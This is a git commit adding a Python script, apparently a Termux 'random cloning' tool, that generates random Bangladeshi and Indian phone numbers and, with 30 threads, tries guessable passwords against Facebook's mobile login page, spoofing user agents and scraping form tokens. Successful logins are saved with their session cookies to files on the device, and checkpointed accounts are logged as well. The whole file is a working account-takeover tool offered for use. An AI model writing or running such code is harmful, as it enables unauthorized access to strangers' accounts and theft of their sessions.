f04ec11e654d84bebe4b56e32312a03d6096f77c
Mridul <157994646+MaidulRM@users.noreply.github.com>
2024-01-29 03:56:40 +0600

    Add files via upload

---
+++ MRM.py
@@ -0,0 +1,292 @@
+#________________ IMPORT ______________#
+import os,time
+os.system('clear')
+print(f'\x1b[1;97m[=] SYSTEM LOADING BOSS ');time.sleep(1)
+from os import path
+import os,base64,zlib,pip,urllib
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        print(f'\x1b[1;97m[=] MISSING MODEL INSTALL ');
+        os.system('pip install requests futures==2 > /dev/null')
+except:pass
+#________________ LOOP ______________#
+user=[];oks=[];cps=[];loop=0;ugen=[]
+#________________ COLOUR ______________#
+A = '\x1b[1;97m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m'
+#________________ USER AGENT ______________#
+for habibxxxx in range(10000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+#________________ LINEX ______________#
+def clear():os.system('clear');print(logo)
+def linex():print(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+#________________ LOGOX ______________#
+logo=(f'''
+{A}88b           d88  88888888ba   88b           d88
+{A}888b         d888  88      "8b  888b         d888
+{A}88`8b       d8'88  88      ,8P  88`8b       d8'88
+{A}88 `8b     d8' 88  88aaaaaa8P'  88 `8b     d8' 88
+{A}88  `8b   d8'  88  88""""88'    88  `8b   d8'  88
+{A}88   `8b d8'   88  88    `8b    88   `8b d8'   88
+{A}88    `888'    88  88     `8b   88    `888'    88
+{A}88     `8'     88  88      `8b  88     `8'     88''')                                          V/0.0
+{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{A}[√] DEVELOPER : MRIDUL Islam
+{A}[√] TOOL      : RANDOM CLONING {A}[{G}BD{A}|{G}IND{A}]
+{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''') 
+#________________ MENU _____________#
+def menu():
+    clear()
+    print(f'{A}[1] RANDOM {G}BD-MIX {A}CLONE ');print(f'{A}[2] RANDOM {G}BD-NEW {A}CLONE');print(f'{A}[3] RANDOM {G}IND {A}CLONE');print(f'{A}[0] EXIT SWAG');linex()
+    swag=input(f'{A}[?] CHOICE : ')
+    if swag in '1':randm_bd_mix()
+    if swag in '2':randm_bd_new()
+    if swag in '3':randm_ind()
+    if swag in '0':sys.exit(f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+#________________ RANDOM-BD-MIX _____________# 
+def randm_bd_mix():
+     clear()
+     print(f'{A}[=] SIM CODE : 017 | 019 | 018 | 016');linex()
+     code=input(f'{A}[?] CHOICE   : ')
+     clear()
+     print(f'{A}[=] LIMIT EXAMPLE : 5000 | 10000 | 9999');linex()
+     limit=int(input(f'{A}[?] CHOICE  : '))
+     clear()
+     print(f"{A}[1] METHOD M1 ")
+     print(f"{A}[2] METHOD M2 ");linex()
+     mthd=input(f'{A}[?] CHOICE : ')
+     for x in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+     with tred(max_workers=30) as habibx:
+        clear()
+        total=str(len(user))
+        print(f'{A}[=] SIM CODE :{G} {code} {A}BD-MIX')
+        print(f'{A}[=] TOTAL ID :{G} {total}')
+        print(f'{A}[=] TURN ON/OFF AIRPLANE MODE ');linex()
+        for love in user:
+            uid = code+love
+            bal1 = love[:6]
+            bal2 = love[:7]
+            bal3 = uid[:8]
+            pss = [love,uid,bal1,bal2,bal3,'Bangla','bangla','Free Fire','free fire','@#@#@#','@@@###']
+            if mthd in ['1','01']:habibx.submit(habibxx1,uid,pss)
+            if mthd in ['2','02']:habibx.submit(habibxx2,uid,pss)
+     print(f' ')
+     print(f'\n{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+     print(f"{A}[=] CLONE COMPLETE BROTHER ")
+     print(f'{A}[=] TOTAL OK/CP :{G} {str(len(ok))}/{str(len(cp))}')
+     print(f'\n{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+     exit()
+#________________ RANDOM-BD-NEW _____________# 
+def randm_bd_new():
+     clear()
+     print(f'{A}[=] SIM CODE : 017 | 019 | 018 | 016');linex()
+     code=input(f'{A}[?] CHOICE   : ')
+     clear()
+     print(f'{A}[=] LIMIT EXAMPLE : 5000 | 10000 | 9999');linex()
+     limit=int(input(f'{A}[?] CHOICE  : '))
+     clear()
+     print(f"{A}[1] METHOD M1 ")
+     print(f"{A}[2] METHOD M2 ");linex()
+     mthd=input(f'{A}[?] CHOICE : ')
+     for x in range(limit):
+        balx1 = ''.join(random.choice(string.digits) for _ in range(2))
+        balx2 = ''.join(random.choice(string.digits) for _ in range(2))
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+     with tred(max_workers=30) as habibx:
+        clear()
+        total=str(len(user))
+        print(f'{A}[=] SIM CODE :{G} {code} {A}BD-NEW')
+        print(f'{A}[=] TOTAL ID :{G} {total}')
+        print(f'{A}[=] TURN ON/OFF AIRPLANE MODE ');linex()
+        for love in user:
+            uid = code+balx1+balx2+love
+            pss = [balx1+balx2+love,balx2+love,code+balx1+balx2,code+code,code+'123',code+'1234','FREE FIRE','free fire','i love you']
+            if mthd in ['1','01']:habibx.submit(habibxx1,uid,pss)
+            if mthd in ['2','02']:habibx.submit(habibxx2,uid,pss)
+     print(f' ')
+     print(f'\n{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+     print(f"{A}[=] CLONE COMPLETE BROTHER ")
+     print(f'{A}[=] TOTAL OK/CP :{G} {str(len(ok))}/{str(len(cp))}')
+     print(f'\n{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+     exit()
+#________________ RANDOM-IND _____________#
+def randm_ind():
+     clear()
+     print(f'{A}[=] SIM CODE : +91639 | +91892 | +91219 ');linex()
+     code=input(f'{A}[?] CHOICE   : ')
+     clear()
+     print(f'{A}[=] LIMIT EXAMPLE : 5000 | 10000 | 9999');linex()
+     limit=int(input(f'{A}[?] CHOICE  : '))
+     clear()
+     print(f"{A}[1] METHOD M1 ")
+     print(f"{A}[2] METHOD M2 ");linex()
+     mthd=input(f'{A}[?] CHOICE : ')
+     for x in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+     with tred(max_workers=30) as habibx:
+        clear()
+        total=str(len(user))
+        print(f'{A}[=] SIM CODE :{G} {code} {A}IND')
+        print(f'{A}[=] TOTAL ID :{G} {total}')
+        print(f'{A}[=] TURN ON/OFF AIRPLANE MODE ');linex()
+        for love in user:
+            uid = code+love
+            pss = ['57575752','india123','57575751','57273200','59039200',uid,love,uid[3:]]
+            if mthd in ['1','01']:habibx.submit(habibxx1,uid,pss)
+            if mthd in ['2','02']:habibx.submit(habibxx2,uid,pss)
+     print(f' ')
+     print(f'\n{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+     print(f"{A}[=] CLONE COMPLETE BROTHER ")
+     print(f'{A}[=] TOTAL OK/CP :{G} {str(len(ok))}/{str(len(cp))}')
+     print(f'\n{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+     exit()
+#________________ RANDOM-METHOD-M1 _____________#
+def habibxx1(uid,pss):
+    global oks,cps,loop
+    try:
+        for ps in pss:
+            session=requests.Session()
+            sys.stdout.write(f'\r\r{A}[SWAG-M1] {loop} {len(oks)}|{len(cps)} ')
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            headxx={'authority': 'x.facebook.com',
+            'method':'GET',
+            'scheme':'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"Infinix X6515"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro,
+            'viewport-width': '980',}
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=headxx).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                uid = re.findall('c_user=(.*);xs', coki)[0]
+                balxd1 = requests.get(f"https://graph.facebook.com/"+uid+"/picture?type=normal").text
+                if 'Photoshop' in balxd1:
+                    print(f'\r\r{G}[SWAG-OK] {uid} | {ps} | {coki}')
+                    linex()
+                    open('/sdcard/SWAG-RANDM-OK-M1.txt', 'a').write(uid+' | '+ps+' |-> '+coki+"\n")
+                    oks.append(uid)
+                    break
+                else:pass
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki1 = coki.split("1000")[1]
+                uid = "1000"+coki1[0:11]
+                #print(f'\r\r{Y}[SWAG-CP] {uid} | {ps}')
+                open('/sdcard/SWAG-RANDM-CP','a').write(uid+'>'+ps+'\n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+#________________ RANDOM-METHOD-M2 _____________#
+def habibxx2(uid,pss):
+    global oks,cps,loop
+    try:
+        for ps in pss:
+            session=requests.Session()
+            sys.stdout.write(f'\r\r{A}[SWAG-M2] {loop} {len(oks)}|{len(cps)} ')
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://m.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            headxx={'authority': 'x.facebook.com',
+            'method':'GET',
+            'scheme':'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"Infinix X6515"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro,
+            'viewport-width': '980',}
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=headxx).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                uid = re.findall('c_user=(.*);xs', coki)[0]
+                balxd2 = f'https://graph.facebook.com/{uid}/picture?type=normal'
+                uff = requests.get(balxd2).text
+                if 'Photoshop' in uff:
+                    print(f'\r\r{G}[SWAG-OK] {uid} | {ps} | {coki}')
+                    linex()
+                    open('/sdcard/SWAG-RANDM-OK-M2.txt', 'a').write(uid+' | '+ps+' |-> '+coki+"\n")
+                    oks.append(uid)
+                    break
+                else:pass
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                coki1 = coki.split("1000")[1]
+                uid = "1000"+coki1[0:11]
+                #print(f'\r\r{Y}[SWAG-CP] {uid} | {ps}')
+                open('/sdcard/SWAG-RANDM-CP','a').write(uid+'>'+ps+'\n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+
+menu()
